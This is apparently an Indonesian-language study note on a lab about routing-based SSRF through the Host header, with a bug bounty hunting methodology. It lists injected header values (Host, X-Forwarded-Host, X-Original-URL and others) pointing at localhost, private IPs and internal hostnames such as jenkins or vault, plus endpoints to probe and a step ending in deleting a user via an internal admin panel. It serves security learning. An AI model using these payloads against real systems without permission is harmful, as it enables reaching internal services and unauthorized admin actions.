# Routing-Based SSRF via Host Header

## 📖 Konsep

Lab ini memanfaatkan **Routing-Based SSRF** yang terjadi karena **Reverse Proxy, Load Balancer, atau Middleware** menggunakan nilai dari **Host Header** (atau header sejenis) untuk menentukan ke mana request akan diteruskan.

Berbeda dengan SSRF biasa yang berasal dari parameter seperti:

```
url=
redirect=
next=
callback=
webhook=
```

Routing-Based SSRF berasal dari manipulasi **HTTP Header**.

Jika backend mempercayai Host Header, attacker dapat mengarahkan request menuju:

- Localhost
- Private IP
- Internal Service
- Admin Panel
- Backend API
- Service Mesh

---

## ⚙️ Cara Kerja

```
Client
   │
   ▼
Host: 127.0.0.1
   │
   ▼
Reverse Proxy
   │
   ▼
Routing berdasarkan Host Header
   │
   ▼
Request diteruskan ke localhost
   │
   ▼
Admin Panel Internal
```

---

## 🧠 Root Cause

Aplikasi atau middleware mempercayai nilai dari Host Header untuk menentukan tujuan request.

Contoh normal:

```
Host: example.com
```

Kemudian attacker mengubah menjadi:

```
Host: localhost
```

atau

```
Host: 127.0.0.1
```

atau

```
Host: 192.168.1.10
```

Akibatnya backend mengirim request ke service internal.

---

# 🎯 Alur Serangan (Lab)

1. Kirim request normal.
2. Ganti Host dengan Burp Collaborator.
3. Pastikan Collaborator menerima request.
4. Brute-force subnet internal.
5. Cari response yang berbeda.
6. Temukan admin panel.
7. Akses `/admin`.
8. Delete user.

---

# 🌍 Pendekatan Real Bug Bounty

Pada dunia nyata biasanya **tidak ada petunjuk subnet internal** seperti di lab.

Targetnya bukan langsung brute-force IP.

Yang dilakukan adalah mencari indikasi bahwa aplikasi melakukan routing berdasarkan header.

Urutan yang biasanya dilakukan:

```
Request Normal
        │
        ▼
Ubah Header
        │
        ▼
Collaborator Hit?
        │
      Ya
        │
        ▼
Cari Host Internal
        │
        ▼
Cari Endpoint Internal
        │
        ▼
Eksploitasi
```

---

# 🔍 Tahap 1 — Konfirmasi SSRF

Pertama pastikan server benar-benar melakukan request.

Contoh:

```
Host: xxxx.oastify.com
```

atau

```
Host: xxxx.burpcollaborator.net
```

Jika Burp Collaborator menerima:

```
DNS Interaction
```

atau

```
HTTP Interaction
```

berarti middleware benar-benar melakukan routing.

Jangan langsung brute-force IP sebelum tahap ini berhasil.

---

# 🔍 Tahap 2 — Target yang Biasanya Dicoba

## Localhost

```
Host: localhost
```

## IPv4 Loopback

```
Host: 127.0.0.1
```

## IPv6 Loopback

```
Host: ::1
```

## Private IP

```
Host: 10.0.0.1
```

```
Host: 10.10.10.10
```

```
Host: 172.16.0.1
```

```
Host: 172.31.255.254
```

```
Host: 192.168.1.1
```

```
Host: 192.168.0.10
```

---

# 🔍 Tahap 3 — Hostname Internal

Banyak perusahaan menggunakan DNS Internal.

Misalnya:

```
Host: admin.internal
```

```
Host: backend.internal
```

```
Host: api.internal
```

```
Host: intranet.internal
```

```
Host: jenkins.internal
```

```
Host: grafana.internal
```

```
Host: prometheus.internal
```

```
Host: kibana.internal
```

```
Host: vault.internal
```

```
Host: consul.internal
```

Pada Kubernetes atau Docker sering ditemukan:

```
Host: admin
```

```
Host: api
```

```
Host: backend
```

```
Host: nginx
```

```
Host: grafana
```

```
Host: prometheus
```

```
Host: redis
```

```
Host: elasticsearch
```

---

# 🔍 Tahap 4 — Endpoint Internal

Jika sudah menemukan host yang hidup, coba endpoint yang umum.

```
/
```

```
/admin
```

```
/login
```

```
/dashboard
```

```
/health
```

```
/metrics
```

```
/status
```

```
/debug
```

```
/actuator
```

```
/swagger
```

```
/graphql
```

```
/api
```

---

# 📋 Header yang Wajib Dicoba

## 1. Host

Paling umum.

Contoh:

```
Host: localhost
```

```
Host: 127.0.0.1
```

```
Host: admin.internal
```

Fungsi:

- Routing
- Virtual Host
- Reverse Proxy

⭐⭐⭐⭐⭐

---

## 2. X-Forwarded-Host

Kadang proxy menggunakan header ini dibanding Host.

Contoh:

```
X-Forwarded-Host: localhost
```

```
X-Forwarded-Host: admin.internal
```

⭐⭐⭐⭐⭐

---

## 3. X-Original-Host

Digunakan beberapa reverse proxy.

Contoh:

```
X-Original-Host: localhost
```

```
X-Original-Host: admin.internal
```

⭐⭐⭐⭐

---

## 4. Forwarded

Header standar RFC7239.

Contoh:

```
Forwarded: host=localhost
```

```
Forwarded: host=127.0.0.1
```

```
Forwarded: host=admin.internal
```

⭐⭐⭐⭐

---

## 5. X-Host

Header custom.

Contoh:

```
X-Host: localhost
```

```
X-Host: admin.internal
```

⭐⭐⭐

---

## 6. X-HTTP-Host-Override

Masih digunakan beberapa framework lama.

```
X-HTTP-Host-Override: localhost
```

```
X-HTTP-Host-Override: 127.0.0.1
```

⭐⭐⭐

---

## 7. X-Forwarded-Server

Kadang dipercaya oleh backend.

```
X-Forwarded-Server: localhost
```

⭐⭐⭐

---

## 8. X-Original-URL

Kadang bisa mengubah path.

```
X-Original-URL: /admin
```

```
X-Original-URL: /metrics
```

⭐⭐⭐

---

## 9. X-Rewrite-URL

Digunakan IIS dan beberapa proxy.

```
X-Rewrite-URL: /admin
```

⭐⭐⭐

---

## 10. X-Forwarded-For

⚠️ **Bukan Routing-Based SSRF**

Biasanya dipakai untuk:

```
X-Forwarded-For: 127.0.0.1
```

atau

```
X-Forwarded-For: 10.0.0.1
```

Digunakan untuk menguji:

- IP Whitelist
- Rate Limit
- Admin Only
- Trust Proxy
- Logging

Bukan untuk mengubah tujuan routing.

---

# 🚩 Indikator Vulnerable

Perhatikan perubahan berikut.

Status berubah:

```
404
↓
200
```

atau

```
404
↓
302
```

atau

```
403
↓
200
```

Ukuran response berubah.

Misalnya:

```
Length: 2400
```

menjadi

```
Length: 8100
```

Muncul:

```
Location:
```

atau

```
Set-Cookie:
```

atau

```
Server:
```

atau halaman login internal.

Atau Burp Collaborator menerima:

```
DNS
```

```
HTTP
```

---

# 🕵️ Hunting Checklist

✅ Test Host

✅ Test X-Forwarded-Host

✅ Test X-Original-Host

✅ Test Forwarded

✅ Test X-Host

✅ Test X-HTTP-Host-Override

✅ Test X-Forwarded-Server

✅ Test X-Original-URL

✅ Test X-Rewrite-URL

✅ Konfirmasi dengan Burp Collaborator

✅ Coba localhost

✅ Coba 127.0.0.1

✅ Coba ::1

✅ Coba Private IP

✅ Coba Hostname Internal

✅ Coba Endpoint Internal

✅ Bandingkan Status Code

✅ Bandingkan Response Size

✅ Bandingkan Header Response

---

# 📚 Pelajaran Lab

- SSRF tidak selalu berasal dari parameter URL.
- Reverse Proxy dapat menjadi sumber SSRF.
- Host Header sering dipercaya untuk melakukan routing.
- Header forwarding juga dapat memengaruhi routing.
- Collaborator adalah cara tercepat untuk memastikan SSRF.
- Pada bug bounty nyata, jangan langsung brute-force subnet. Konfirmasi terlebih dahulu bahwa request benar-benar diteruskan.

---

# ⚡ Hafalan Cepat

```
Host Header
        │
        ▼
Reverse Proxy
        │
        ▼
Routing Internal
        │
        ▼
Collaborator Hit
        │
        ▼
localhost
127.0.0.1
Private IP
Hostname Internal
        │
        ▼
/admin
/metrics
/health
        │
        ▼
Admin Panel Internal
```

---

# 🔑 Inti Lab

## Bug Class

```
Routing-Based SSRF
```

## Root Cause

```
Reverse Proxy atau Middleware mempercayai Host Header untuk menentukan tujuan routing.
```

## Header Utama

```
Host
```

## Header Tambahan

```
X-Forwarded-Host
X-Original-Host
Forwarded
X-Host
X-HTTP-Host-Override
X-Forwarded-Server
X-Original-URL
X-Rewrite-URL
```

## Target Umum

```
localhost
127.0.0.1
::1
10.x.x.x
172.16.x.x
192.168.x.x
admin.internal
backend.internal
grafana
jenkins
api
```

## Indikator

```
Collaborator Hit

Status Berubah

Response Size Berubah

Header Berubah

Admin Panel Internal
```

## Tahap Akhir

```
Konfirmasi SSRF
        │
        ▼
Temukan Host Internal
        │
        ▼
Temukan Endpoint Internal
        │
        ▼
Akses Service Internal
        │
        ▼
Eksploitasi
```
